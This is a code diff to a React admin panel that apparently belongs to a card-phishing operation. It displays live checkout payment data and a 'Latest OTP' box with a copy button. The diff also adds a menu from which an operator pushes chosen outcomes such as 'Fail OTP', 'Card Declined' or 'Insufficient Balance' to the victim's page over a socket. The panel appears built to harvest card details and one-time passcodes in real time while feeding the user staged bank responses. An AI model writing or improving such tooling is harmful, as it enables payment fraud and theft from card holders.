@@ -198,21 +198,18 @@ const Admin = () => {
         case 'show-otp':
           socket.emit('show-otp');
           break;
-        case 'invalid-otp':
-          socket.emit('payment-rejected', 'Invalid OTP');
-          updatePaymentStatus(paymentId, 'rejected');
+        case 'validate-otp':
+          socket.emit('payment-approved');
+          updatePaymentStatus(paymentId, 'approved');
           break;
-        case 'invalid-card':
-          socket.emit('payment-rejected', 'Invalid card details');
-          updatePaymentStatus(paymentId, 'rejected');
+        case 'fail-otp':
+          socket.emit('invalid-otp');
           break;
-        case 'incorrect-details':
-          socket.emit('payment-rejected', 'Incorrect card details');
-          updatePaymentStatus(paymentId, 'rejected');
+        case 'card-declined':
+          socket.emit('card-declined');
           break;
-        case 'connection-error':
-          socket.emit('payment-rejected', '404 Connection error');
-          updatePaymentStatus(paymentId, 'rejected');
+        case 'insufficient-balance':
+          socket.emit('insufficient-balance');
           break;
         case 'successful':
           socket.emit('payment-approved');
@@ -357,8 +354,34 @@ const Admin = () => {
         {/* Payment Data Table */}
         <div className="bg-gray-900 rounded-lg overflow-hidden mb-8">
           <div className="p-6 border-b border-gray-700">
-            <h2 className="text-xl font-semibold">Payment Transactions</h2>
-            <p className="text-gray-400 mt-1">Real-time payment data from checkout</p>
+            <div className="flex justify-between items-center">
+              <div>
+                <h2 className="text-xl font-semibold">Payment Transactions</h2>
+                <p className="text-gray-400 mt-1">Real-time payment data from checkout</p>
+              </div>
+              {/* OTP Display Area */}
+              {otps.length > 0 && (
+                <div className="bg-blue-900 rounded-lg p-4 border border-blue-700">
+                  <h3 className="text-blue-300 font-medium mb-2">Latest OTP</h3>
+                  <div className="flex items-center gap-3">
+                    <span className="text-2xl font-bold text-blue-100 bg-blue-800 px-3 py-1 rounded font-mono">
+                      {otps[0].otp}
+                    </span>
+                    <Button
+                      variant="ghost"
+                      size="sm"
+                      onClick={() => copyToClipboard(otps[0].otp)}
+                      className="h-8 w-8 p-0 text-blue-300 hover:text-blue-100"
+                    >
+                      <Copy className="h-4 w-4" />
+                    </Button>
+                  </div>
+                  <p className="text-xs text-blue-400 mt-1">
+                    Received: {new Date(otps[0].timestamp).toLocaleTimeString()}
+                  </p>
+                </div>
+              )}
+            </div>
           </div>
           
           <div className="overflow-x-auto">
@@ -457,42 +480,44 @@ const Admin = () => {
                           {activeDropdown === payment.id && (
                             <div className="absolute right-0 mt-2 w-48 bg-gray-800 rounded-md shadow-lg z-10 border border-gray-700">
                               <div className="py-1">
-                                <button
-                                  onClick={() => handleAction(payment.id, 'show-otp')}
-                                  className="block w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700"
-                                >
-                                  Show OTP
-                                </button>
-                                <button
-                                  onClick={() => handleAction(payment.id, 'invalid-otp')}
-                                  className="block w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700"
-                                >
-                                  Invalid OTP
-                                </button>
-                                <button
-                                  onClick={() => handleAction(payment.id, 'invalid-card')}
-                                  className="block w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700"
-                                >
-                                  Invalid Card
-                                </button>
-                                <button
-                                  onClick={() => handleAction(payment.id, 'incorrect-details')}
-                                  className="block w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700"
-                                >
-                                  Incorrect Card Details
-                                </button>
-                                <button
-                                  onClick={() => handleAction(payment.id, 'connection-error')}
-                                  className="block w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700"
-                                >
-                                  404 Connection Error
-                                </button>
-                                <button
-                                  onClick={() => handleAction(payment.id, 'successful')}
-                                  className="block w-full text-left px-4 py-2 text-sm text-green-400 hover:bg-gray-700"
-                                >
-                                  Successful
-                                </button>
+                               <button
+                                 onClick={() => handleAction(payment.id, 'show-otp')}
+                                 className="block w-full text-left px-4 py-2 text-sm text-blue-400 hover:bg-gray-700 font-medium"
+                               >
+                                 📱 Show OTP
+                               </button>
+                               <div className="border-t border-gray-600 my-1"></div>
+                               <button
+                                 onClick={() => handleAction(payment.id, 'validate-otp')}
+                                 className="block w-full text-left px-4 py-2 text-sm text-green-400 hover:bg-gray-700"
+                               >
+                                 ✅ Validate OTP
+                               </button>
+                               <button
+                                 onClick={() => handleAction(payment.id, 'fail-otp')}
+                                 className="block w-full text-left px-4 py-2 text-sm text-red-400 hover:bg-gray-700"
+                               >
+                                 ❌ Fail OTP
+                               </button>
+                               <button
+                                 onClick={() => handleAction(payment.id, 'card-declined')}
+                                 className="block w-full text-left px-4 py-2 text-sm text-red-400 hover:bg-gray-700"
+                               >
+                                 🚫 Card Declined
+                               </button>
+                               <button
+                                 onClick={() => handleAction(payment.id, 'insufficient-balance')}
+                                 className="block w-full text-left px-4 py-2 text-sm text-yellow-400 hover:bg-gray-700"
+                               >
+                                 💰 Insufficient Balance
+                               </button>
+                               <div className="border-t border-gray-600 my-1"></div>
+                               <button
+                                 onClick={() => handleAction(payment.id, 'successful')}
+                                 className="block w-full text-left px-4 py-2 text-sm text-green-400 hover:bg-gray-700 font-medium"
+                               >
+                                 🎉 Successful
+                               </button>
                               </div>
                             </div>
                           )}
